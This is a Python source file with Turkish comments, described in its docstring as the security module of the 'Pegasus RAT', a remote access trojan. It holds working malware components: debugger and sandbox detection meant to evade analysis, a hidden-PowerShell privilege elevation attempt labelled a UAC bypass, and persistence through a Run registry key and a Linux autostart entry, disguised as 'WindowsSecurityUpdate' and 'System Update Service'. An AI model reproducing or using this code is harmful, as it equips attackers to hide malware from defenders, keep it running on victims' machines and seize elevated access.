#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus RAT Güvenlik Modülü - Python adaptasyonu
Anti-analiz, mutex kontrolü, yetki yükseltme özellikleri
"""

import os
import sys
import time
import threading
import platform
import subprocess
import ctypes
import hashlib
import psutil
import tempfile
from pathlib import Path

class MutexControl:
    """
    Mutex kontrolü - aynı anda sadece bir instance çalışmasını sağlar
    """
    
    def __init__(self, mutex_name="PegasusLokiMutex"):
        self.mutex_name = mutex_name
        self.mutex_file = None
        self.created = False
        
    def create_mutex(self):
        """
        Mutex oluşturur, başarılıysa True döner
        """
        try:
            if platform.system() == "Windows":
                return self._create_windows_mutex()
            else:
                return self._create_unix_mutex()
        except Exception as e:
            print(f"Mutex oluşturma hatası: {e}")
            return False
    
    def _create_windows_mutex(self):
        """
        Windows mutex oluşturur
        """
        try:
            import win32event
            import win32api
            import winerror
            
            # Mutex oluşturmaya çalış
            mutex = win32event.CreateMutex(None, True, self.mutex_name)
            
            if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
                # Mutex zaten var, başka bir instance çalışıyor
                win32api.CloseHandle(mutex)
                return False
            
            # Mutex başarıyla oluşturuldu
            self.mutex_handle = mutex
            self.created = True
            return True
            
        except ImportError:
            # win32api yoksa dosya tabanlı mutex kullan
            return self._create_unix_mutex()
        except Exception as e:
            print(f"Windows mutex hatası: {e}")
            return False
    
    def _create_unix_mutex(self):
        """
        Unix/Linux için dosya tabanlı mutex
        """
        try:
            mutex_dir = tempfile.gettempdir()
            mutex_path = os.path.join(mutex_dir, f".{self.mutex_name}.lock")
            
            # PID dosyası kontrol et
            if os.path.exists(mutex_path):
                try:
                    with open(mutex_path, 'r') as f:
                        old_pid = int(f.read().strip())
                    
                    # Eski PID hala çalışıyor mu kontrol et
                    if psutil.pid_exists(old_pid):
                        try:
                            proc = psutil.Process(old_pid)
                            if proc.is_running():
                                return False  # Başka instance çalışıyor
                        except:
                            pass
                    
                    # Eski PID çalışmıyor, dosyayı sil
                    os.remove(mutex_path)
                except:
                    pass
            
            # Yeni mutex dosyası oluştur
            with open(mutex_path, 'w') as f:
                f.write(str(os.getpid()))
            
            self.mutex_file = mutex_path
            self.created = True
            return True
            
        except Exception as e:
            print(f"Unix mutex hatası: {e}")
            return False
    
    def release_mutex(self):
        """
        Mutex'i serbest bırakır
        """
        try:
            if platform.system() == "Windows" and hasattr(self, 'mutex_handle'):
                import win32api
                win32api.CloseHandle(self.mutex_handle)
            elif self.mutex_file and os.path.exists(self.mutex_file):
                os.remove(self.mutex_file)
            
            self.created = False
            
        except Exception as e:
            print(f"Mutex serbest bırakma hatası: {e}")

class AntiAnalysis:
    """
    Anti-analiz ve sandbox tespit özellikleri
    """
    
    @staticmethod
    def is_debugger_present():
        """
        Debugger varlığını kontrol eder
        """
        try:
            if platform.system() == "Windows":
                # Windows için debugger kontrolü
                kernel32 = ctypes.windll.kernel32
                return kernel32.IsDebuggerPresent()
            else:
                # Linux için ptrace kontrolü
                try:
                    with open('/proc/self/status', 'r') as f:
                        status = f.read()
                        if 'TracerPid:\t0' not in status:
                            return True
                except:
                    pass
                
                return False
                
        except Exception:
            return False
    
    @staticmethod
    def is_sandbox():
        """
        Sandbox ortamını tespit eder
        """
        sandbox_indicators = []
        
        try:
            # VM/Sandbox isimleri
            vm_names = [
                'vmware', 'virtualbox', 'vbox', 'qemu', 'xen',
                'sandbox', 'malware', 'virus', 'analysis',
                'cuckoo', 'anubis', 'joebox', 'threatexpert'
            ]
            
            # Hostname kontrolü
            hostname = platform.node().lower()
            for vm_name in vm_names:
                if vm_name in hostname:
                    sandbox_indicators.append(f"Hostname: {hostname}")
            
            # Kullanıcı adı kontrolü
            username = os.getenv('USERNAME', os.getenv('USER', '')).lower()
            for vm_name in vm_names:
                if vm_name in username:
                    sandbox_indicators.append(f"Username: {username}")
            
            # Sistem bilgileri kontrolü
            if platform.system() == "Windows":
                try:
                    # Registry kontrolü
                    import winreg
                    
                    # VMware kontrolü
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                           r"SOFTWARE\VMware, Inc.\VMware Tools")
                        winreg.CloseKey(key)
                        sandbox_indicators.append("VMware Tools tespit edildi")
                    except:
                        pass
                    
                    # VirtualBox kontrolü
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                           r"SOFTWARE\Oracle\VirtualBox Guest Additions")
                        winreg.CloseKey(key)
                        sandbox_indicators.append("VirtualBox Guest Additions tespit edildi")
                    except:
                        pass
                        
                except ImportError:
                    pass
            
            # Düşük RAM kontrolü (sandbox'lar genelde az RAM'e sahip)
            try:
                total_ram = psutil.virtual_memory().total / (1024**3)  # GB
                if total_ram < 2:
                    sandbox_indicators.append(f"Düşük RAM: {total_ram:.1f}GB")
            except:
                pass
            
            # Düşük CPU çekirdek sayısı
            try:
                cpu_count = psutil.cpu_count()
                if cpu_count < 2:
                    sandbox_indicators.append(f"Düşük CPU: {cpu_count} çekirdek")
            except:
                pass
            
            return len(sandbox_indicators) > 0, sandbox_indicators
            
        except Exception as e:
            print(f"Sandbox tespit hatası: {e}")
            return False, []
    
    @staticmethod
    def sleep_evasion(seconds=5):
        """
        Uyku tabanlı sandbox evasion
        """
        try:
            start_time = time.time()
            time.sleep(seconds)
            end_time = time.time()
            
            # Gerçek uyku süresi kontrolü
            actual_sleep = end_time - start_time
            expected_sleep = seconds
            
            # %80'den az uyuduysa sandbox olabilir
            if actual_sleep < (expected_sleep * 0.8):
                return True  # Sandbox şüphesi
            
            return False
            
        except Exception:
            return False

class PrivilegeEscalation:
    """
    Yetki yükseltme özellikleri
    """
    
    @staticmethod
    def is_admin():
        """
        Admin yetkisi kontrolü
        """
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except Exception:
            return False
    
    @staticmethod
    def uac_bypass_attempt():
        """
        UAC bypass denemesi (Windows)
        """
        if platform.system() != "Windows":
            return False
        
        try:
            # Mevcut executable path
            current_exe = sys.executable
            
            # UAC bypass için PowerShell komutu
            ps_command = f'''
            Start-Process -FilePath "{current_exe}" -Verb RunAs -WindowStyle Hidden
            '''
            
            # PowerShell ile çalıştır
            subprocess.Popen([
                "powershell", "-WindowStyle", "Hidden", 
                "-ExecutionPolicy", "Bypass", "-Command", ps_command
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            
            return True
            
        except Exception as e:
            print(f"UAC bypass hatası: {e}")
            return False
    
    @staticmethod
    def add_to_startup():
        """
        Başlangıç programlarına ekler
        """
        try:
            if platform.system() == "Windows":
                return PrivilegeEscalation._add_windows_startup()
            else:
                return PrivilegeEscalation._add_linux_startup()
        except Exception as e:
            print(f"Başlangıç ekleme hatası: {e}")
            return False
    
    @staticmethod
    def _add_windows_startup():
        """
        Windows başlangıç registry'sine ekler
        """
        try:
            import winreg
            
            current_exe = sys.executable
            app_name = "WindowsSecurityUpdate"
            
            # Registry anahtarını aç
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            
            # Değeri ekle
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            return True
            
        except Exception as e:
            print(f"Windows başlangıç hatası: {e}")
            return False
    
    @staticmethod
    def _add_linux_startup():
        """
        Linux başlangıç dosyasına ekler
        """
        try:
            current_exe = sys.executable
            
            # Autostart dizini
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            
            # Desktop entry dosyası
            desktop_file = os.path.join(autostart_dir, "system-update.desktop")
            
            desktop_content = f"""[Desktop Entry]
Version=1.0
Type=Application
Name=System Update Service
Exec={current_exe}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            return True
            
        except Exception as e:
            print(f"Linux başlangıç hatası: {e}")
            return False

class SecurityManager:
    """
    Güvenlik yöneticisi - tüm güvenlik özelliklerini koordine eder
    """
    
    def __init__(self, config=None):
        self.config = config
        self.mutex_control = None
        self.security_checks_passed = False
        
    def initialize_security(self):
        """
        Güvenlik kontrollerini başlatır
        """
        try:
            print("Güvenlik kontrolleri başlatılıyor...")
            
            # 1. Mutex kontrolü
            mutex_name = "PegasusLokiMutex"
            if self.config:
                mutex_name = self.config.get_setting('mutex', mutex_name)
            
            self.mutex_control = MutexControl(mutex_name)
            if not self.mutex_control.create_mutex():
                print("Başka bir instance zaten çalışıyor!")
                return False
            
            # 2. Anti-analiz kontrolleri
            if self._should_check_analysis():
                if not self._perform_analysis_checks():
                    print("Analiz ortamı tespit edildi!")
                    return False
            
            # 3. Yetki kontrolleri
            self._check_privileges()
            
            self.security_checks_passed = True
            print("Güvenlik kontrolleri başarılı")
            return True
            
        except Exception as e:
            print(f"Güvenlik başlatma hatası: {e}")
            return False
    
    def _should_check_analysis(self):
        """
        Anti-analiz kontrolü yapılmalı mı?
        """
        if self.config:
            aspida_setting = self.config.get_setting('aspida', 'false')
            return aspida_setting.lower() == 'true'
        return True
    
    def _perform_analysis_checks(self):
        """
        Anti-analiz kontrollerini gerçekleştirir
        """
        try:
            # Debugger kontrolü
            if AntiAnalysis.is_debugger_present():
                print("Debugger tespit edildi!")
                return False
            
            # Sandbox kontrolü
            is_sandbox, indicators = AntiAnalysis.is_sandbox()
            if is_sandbox:
                print(f"Sandbox tespit edildi: {indicators}")
                return False
            
            # Uyku evasion
            if AntiAnalysis.sleep_evasion(3):
                print("Sandbox uyku evasion tespit edildi!")
                return False
            
            return True
            
        except Exception as e:
            print(f"Analiz kontrolü hatası: {e}")
            return True  # Hata durumunda devam et
    
    def _check_privileges(self):
        """
        Yetki kontrolü ve gerekirse yükseltme
        """
        try:
            if not PrivilegeEscalation.is_admin():
                print("Admin yetkisi yok")
                
                # UAC bypass denemesi (konfigürasyona göre)
                if self.config:
                    alpha_omega = self.config.get_setting('alpha_omega', 'false')
                    if alpha_omega.lower() == 'true':
                        print("UAC bypass deneniyor...")
                        PrivilegeEscalation.uac_bypass_attempt()
            else:
                print("Admin yetkisi mevcut")
                
                # Başlangıç programlarına ekle
                PrivilegeEscalation.add_to_startup()
                
        except Exception as e:
            print(f"Yetki kontrolü hatası: {e}")
    
    def cleanup(self):
        """
        Güvenlik kaynaklarını temizler
        """
        try:
            if self.mutex_control:
                self.mutex_control.release_mutex()
                self.mutex_control = None
                
        except Exception as e:
            print(f"Güvenlik temizleme hatası: {e}")
    
    def get_status(self):
        """
        Güvenlik durumunu döndürür
        """
        return {
            'security_initialized': self.security_checks_passed,
            'mutex_created': self.mutex_control and self.mutex_control.created,
            'is_admin': PrivilegeEscalation.is_admin(),
            'debugger_present': AntiAnalysis.is_debugger_present()
        }

# Test fonksiyonu
if __name__ == "__main__":
    print("Pegasus Güvenlik Modülü Testi")
    
    # Güvenlik kontrolleri
    print(f"Admin yetkisi: {PrivilegeEscalation.is_admin()}")
    print(f"Debugger mevcut: {AntiAnalysis.is_debugger_present()}")
    
    is_sandbox, indicators = AntiAnalysis.is_sandbox()
    print(f"Sandbox tespit edildi: {is_sandbox}")
    if indicators:
        print(f"Sandbox göstergeleri: {indicators}")
    
    # Mutex testi
    mutex = MutexControl("TestMutex")
    if mutex.create_mutex():
        print("Mutex başarıyla oluşturuldu")
        mutex.release_mutex()
    else:
        print("Mutex oluşturulamadı")
    
    # Güvenlik yöneticisi testi
    manager = SecurityManager()
    status = manager.get_status()
    print(f"Güvenlik durumu: {status}")
